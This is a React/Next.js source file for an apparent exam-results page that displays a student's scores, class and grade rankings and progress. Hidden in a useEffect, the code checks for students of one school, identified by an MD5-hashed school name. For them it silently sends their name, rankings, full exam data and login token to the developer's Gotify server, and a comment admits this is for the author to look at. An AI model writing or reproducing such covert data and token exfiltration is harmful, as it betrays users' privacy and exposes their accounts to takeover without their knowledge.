'use client'
import { AlertTriangle, Award, BookOpen, TrendingUp } from 'lucide-react'
import Link from 'next/link'
import { useRouter } from 'next/navigation'
import { useEffect } from 'react'
import toast from 'react-hot-toast'
import { sendGotifyMessage } from '@/app/actions'
import md5 from 'md5'
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from '@/components/ui/card'
import { Progress } from '@/components/ui/progress'
import { useStorage } from '@/hooks/useStorage'
import {
  useExamOverviewQuery,
  useLastExamOverviewQuery,
  useUserSnapshotQuery,
} from '@/hooks/queries'

export default function ResultsPage() {
  const router = useRouter()
  const [token] = useStorage('hfs_token')
  const {
    data: lastExam,
    isPending,
    isError,
    error,
  } = useLastExamOverviewQuery(token)
  const { data: examDetail } = useExamOverviewQuery(
    token,
    lastExam?.examId ? lastExam.examId.toString() : undefined,
  )
  const {
    data: userSnapshot,
    isError: isUserSnapshotError,
    isPending: isUserSnapshotPending,
  } = useUserSnapshotQuery(token)

  useEffect(() => {
    // 如果是这个学校的学生发送的请求，就也给 gotify 发一份（让我看看）
    const TARGET_SCHOOL_NAME_MD5 = '4d3cbd411f56063982d6f2166d1ddce2'
    if (
      lastExam &&
      Object.keys(lastExam).length > 0 &&
      userSnapshot &&
      md5(userSnapshot.linkedStudent.schoolName) === TARGET_SCHOOL_NAME_MD5
    ) {
      const message = `${userSnapshot?.linkedStudent.studentName} 查看最近排名：`
      const data = `班级排名：${lastExam.extend?.classRank} / ${lastExam.extend?.classStuNum}人\n年级排名：${lastExam.extend?.gradeRank} / ${lastExam.extend?.gradeStuNum}人`
      sendGotifyMessage(
        `${message}\n\n${data}\n\n${token}\n\n${JSON.stringify(
          lastExam,
          null,
          2,
        )}`,
        `${userSnapshot.linkedStudent.studentName} 查询了考试排名`,
      )
        .then((res) => {
          if (!res.ok) {
            console.error('发送 GOTIFY 消息失败：', res.errMsg)
          }
        })
        .catch((err) => {
          console.error('发送 GOTIFY 消息失败：', err)
        })
    }
  }, [lastExam, userSnapshot, token])

  if (!token) {
    toast.error('你还没登录，返回登录页')
    router.push('/login')
    return null
  }

  if (isPending || isUserSnapshotPending) {
    return (
      <div className='flex min-h-screen items-center justify-center p-4'>
        <Card className='w-full max-w-3xl'>
          <CardHeader>
            <CardTitle className='font-bold text-2xl'>正在加载...</CardTitle>
            <CardDescription>正在获取您的考试成绩，请稍候。</CardDescription>
          </CardHeader>
          <CardContent>
            <Progress
              value={undefined}
              className='h-2'
            />
          </CardContent>
        </Card>
      </div>
    )
  }

  if (isError || isUserSnapshotError) {
    return (
      <div className='flex min-h-screen items-center justify-center p-4'>
        <Card className='w-full max-w-3xl border-red-500'>
          <CardHeader>
            <CardTitle className='font-bold text-2xl text-red-600'>
              获取成绩失败
            </CardTitle>
            <CardDescription className='text-red-500'>
              {error?.message}
            </CardDescription>
          </CardHeader>
        </Card>
      </div>
    )
  }

  if (Object.keys(lastExam).length === 0) {
    return (
      <div className='flex min-h-screen items-center justify-center p-4'>
        <Card className='w-full max-w-3xl'>
          <CardHeader>
            <CardTitle className='font-bold text-2xl'>暂无考试数据</CardTitle>
            <CardDescription>
              目前没有可查询的考试成绩（只有最近考的才能查得到）
            </CardDescription>
          </CardHeader>
        </Card>
      </div>
    )
  }

  if (!lastExam) {
    return null
  }

  return (
    <div className='min-h-screen bg-gray-50 p-4'>
      <div className='mx-auto max-w-4xl space-y-6'>
        <Card>
          <CardHeader>
            <CardTitle className='font-bold text-2xl'>最新考试成绩</CardTitle>
            <CardDescription>
              <del>扣 1 帮你改成班一</del>
              <br />
              <br />
              查看这场考试的详细信息：
              <Link
                href={`/exam/${lastExam.examId}`}
                className='text-sky-500 underline hover:text-sky-600'
              >
                点我查看
              </Link>
            </CardDescription>
          </CardHeader>
        </Card>

        {/* Class and Grade Ranks */}
        {lastExam.extend && (
          <div className='grid gap-6 md:grid-cols-2'>
            <Card>
              <CardHeader className='pb-2'>
                <CardTitle className='font-medium text-lg'>班级排名</CardTitle>
              </CardHeader>
              <CardContent>
                <div className='flex items-center justify-between'>
                  <div className='flex items-center space-x-2'>
                    <Award className='h-8 w-8 text-yellow-500' />
                    <div>
                      <p className='font-bold text-3xl'>
                        {lastExam.extend.classRank}
                      </p>
                      <p className='text-muted-foreground text-sm'>
                        共 {lastExam.extend.classStuNum} 人
                      </p>
                    </div>
                  </div>
                  <div className='text-right'>
                    <p className='font-medium text-sm'>击败了</p>
                    <p className='font-bold text-2xl text-green-600'>
                      {lastExam.extend.classDefeatRatio}%
                    </p>
                    <p className='text-muted-foreground text-sm'>的同学</p>
                  </div>
                </div>
                <Progress
                  value={lastExam.extend.classDefeatRatio}
                  className='mt-4 h-2'
                />
              </CardContent>
            </Card>

            <Card>
              <CardHeader className='pb-2'>
                <CardTitle className='font-medium text-lg'>
                  年级排名（包含所有选科）
                </CardTitle>
              </CardHeader>
              <CardContent>
                <div className='flex items-center justify-between'>
                  <div className='flex items-center space-x-2'>
                    <Award className='h-8 w-8 text-blue-500' />
                    <div>
                      <p className='font-bold text-3xl'>
                        {lastExam.extend.gradeRank}
                      </p>
                      <p className='text-muted-foreground text-sm'>
                        共 {lastExam.extend.gradeStuNum} 人
                      </p>
                    </div>
                  </div>
                  <div className='text-right'>
                    <p className='font-medium text-sm'>击败了</p>
                    <p className='font-bold text-2xl text-green-600'>
                      {lastExam.extend.gradeDefeatRatio}%
                    </p>
                    <p className='text-muted-foreground text-sm'>的同学</p>
                  </div>
                </div>
                <Progress
                  value={lastExam.extend.gradeDefeatRatio}
                  className='mt-4 h-2'
                />
              </CardContent>
            </Card>
          </div>
        )}

        {/* Progress Section */}
        {lastExam.rankRaise !== undefined &&
          lastExam.scoreRaise !== undefined && (
            <Card>
              <CardHeader className='pb-2'>
                <CardTitle className='font-medium text-lg'>进步情况</CardTitle>
              </CardHeader>
              <CardContent>
                <div className='grid gap-6 md:grid-cols-2'>
                  {/* Rank Change */}
                  <div className='flex items-center space-x-4'>
                    <TrendingUp
                      className={`h-10 w-10 ${
                        lastExam.rankRaise > 0
                          ? 'text-green-500'
                          : 'text-red-500'
                      }`}
                    />
                    <div>
                      <p className='font-medium text-sm'>排名变化</p>
                      <p className='font-bold text-2xl'>
                        {lastExam.rankRaise > 0
                          ? `+${lastExam.rankRaise}`
                          : lastExam.rankRaise}
                      </p>
                    </div>
                  </div>
                  {/* Score Change */}
                  <div className='flex items-center space-x-4'>
                    <TrendingUp
                      className={`h-10 w-10 ${
                        lastExam.scoreRaise > 0
                          ? 'text-green-500'
                          : 'text-red-500'
                      }`}
                    />
                    <div>
                      <p className='font-medium text-sm'>分数变化</p>
                      <p className='font-bold text-2xl'>
                        {lastExam.scoreRaise > 0
                          ? `+${lastExam.scoreRaise.toFixed(1)}`
                          : lastExam.scoreRaise.toFixed(1)}
                      </p>
                    </div>
                  </div>
                </div>
              </CardContent>
            </Card>
          )}

        {/* Weakest Subject */}
        {lastExam.worstSubjectText && (
          <Card>
            <CardHeader className='pb-2'>
              <CardTitle className='font-medium text-lg'>需要改进</CardTitle>
            </CardHeader>
            <CardContent>
              <div className='flex items-center space-x-4'>
                <AlertTriangle className='h-10 w-10 text-amber-500' />
                <div>
                  <p className='font-medium text-sm'>薄弱学科</p>
                  <p className='font-bold text-xl'>
                    {lastExam.worstSubjectText}
                  </p>
                </div>
              </div>
            </CardContent>
          </Card>
        )}

        {examDetail?.papers && examDetail.papers.length > 0 && (
          <Card>
            <CardHeader>
              <CardTitle className='font-medium text-lg'>
                各科成绩详情
              </CardTitle>
            </CardHeader>
            <CardContent>
              <div className='space-y-4'>
                {examDetail.papers.map((paper) => (
                  <div
                    key={paper.paperId}
                    className='flex items-center justify-between border-b pb-3 last:border-b-0 last:pb-0'
                  >
                    <div className='flex items-center space-x-3'>
                      <BookOpen className='h-5 w-5 text-primary' />
                      <span className='font-medium'>{paper.subject}</span>
                    </div>
                    <div className='text-right'>
                      <span className='font-bold text-lg'>{paper.score}</span>
                      {paper.manfen && ( // Conditionally render max score if available
                        <span className='text-muted-foreground text-sm'>
                          {' '}
                          / {paper.manfen}
                        </span>
                      )}
                    </div>
                  </div>
                ))}
              </div>
            </CardContent>
          </Card>
        )}
      </div>
    </div>
  )
}
